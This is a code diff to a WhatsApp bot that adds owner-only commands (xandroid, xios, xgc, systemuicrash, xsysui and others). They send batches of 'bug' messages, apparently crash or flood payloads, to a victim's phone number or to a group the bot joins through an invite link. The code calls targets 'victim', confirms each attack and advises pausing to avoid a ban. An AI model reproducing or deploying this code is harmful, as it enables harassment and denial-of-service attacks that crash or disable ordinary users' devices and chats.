@@ -30,6 +30,19 @@ const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, s
 let afk = require("./lib/lib/afk");
 const { download } = require('aptoide-scraper');
 const { fetchBuffer, buffergif } = require("./lib/lib/myfunc2")
+
+//bug database
+const { xeontext1 } = require('./lib/69/xeontext1')
+const { xeontext2 } = require('./lib/69/xeontext2')
+const { xeontext3 } = require('./lib/69/xeontext3')
+const { xeontext4 } = require('./lib/69/xeontext4')
+const { xeontext5 } = require('./lib/69/xeontext5')
+const { xeontext6 } = require('./lib/69/xeontext6')
+const { xeontext7 } = require('./lib/69/xeontext7')
+const { xeontext8 } = require('./lib/69/xeontext8')
+const { xeontext9 } = require('./lib/69/xeontext9')
+const { xeontext10 } = require('./lib/69/xeontext10')
+
 /////log
  global.modnumber = '6283833304947' 
 //Media/database
@@ -5404,7 +5417,207 @@ case 'newfeatures':
         reply(newFeatures);
         }
         break;
- 
+			    
+ case "xandroid": {
+  if (!isCreator) return reply(mess.owner)
+  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return reply("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "24102150169") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return reply("The number is not registered on WhatsApp");
+  }
+  reply("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendVariousMessages(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xios": {
+  if (!isCreator) return reply(mess.owner)
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return reply("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "24102150169") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return reply("The number is not registered on WhatsApp");
+  }
+  reply("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xios2":
+  {
+    if (!isCreator) return reply(mess.owner)
+    if (!isBot) {
+      return reply("*This feature is for the bot only!*");
+    }
+    if (!text){
+      return reply(`Example usage: ${prefix + command} 5`)
+      }
+    if (isNaN(parseInt(text))) {
+      return reply("Amount must be a number");
+    }
+    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
+    replygcxeon("please wait, " + command + " bug is in process..");
+    await sleep(1500); // Adjusted sleep time for clarity
+    sendMultiplePaymentInvites(from, encodedValue);
+    await sleep(2500); // Adjusted sleep time for clarity
+    sendReaction('✅');
+  }
+  break;
+  case "xandroid2":
+  {
+    if (!isCreator) return reply(mess.owner)
+    if (!isBot) {
+      return reply("*This feature is for the bot only!*");
+    }
+    if (!text){
+      return reply(`Example usage: ${prefix + command} 5`)
+      }
+    if (isNaN(parseInt(text))) {
+      return reply("Amount must be a number");
+    }
+    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
+    reply("please wait, " + command + " bug is in process..");
+    await sleep(1500); // Adjusted sleep time for clarity
+    sendVariousMessages(from, encodedValue);
+    await sleep(2500); // Adjusted sleep time for clarity
+    sendReaction('✅');
+  }
+  break;
+  case "xgc":
+  {
+    if (!isCreator) return reply(mess.owner)
+    if (!text) {
+      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
+    }
+    reply("please wait, " + command + " bug is in process..");
+    if (!text.split(" ")[0].includes("whatsapp.com")) {
+      return reply("Link Invalid!");
+    }
+    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
+    try {
+      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
+      let groupTarget = await Maria.groupAcceptInvite(groupLink);
+      await sleep(2000); // Adjusted sleep time for clarity
+      sendViewOnceMessages(groupTarget, bugAmount);
+      await sleep(2500); // Adjusted sleep time for clarity
+      reply("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
+      Maria.groupLeave(groupTarget);
+    } catch (error) {
+      reply(util.format(error));
+    }
+  }
+  break;
+  case "systemuicrash": {
+  if (!isCreator) return reply(mess.owner)
+  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return reply("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "24102150169") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return reply("The number is not registered on WhatsApp");
+  }
+  reply("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendMixedMessages(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xsysui": {
+  if (!isCreator) return reply(mess.owner)
+  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return reply("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "24102150169") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return reply("The number is not registered on WhatsApp");
+  }
+  replygcxeon("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendRepeatedMessages2(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+}
+break;
+case 'clearall': {
+if (!isCreator) return reply(mess.owner)
+Maria.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
+}
+break
+case 'clearchat':
+xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
+break			    
 /////////////////////////////////////////////////////
 
 if(isCmd){
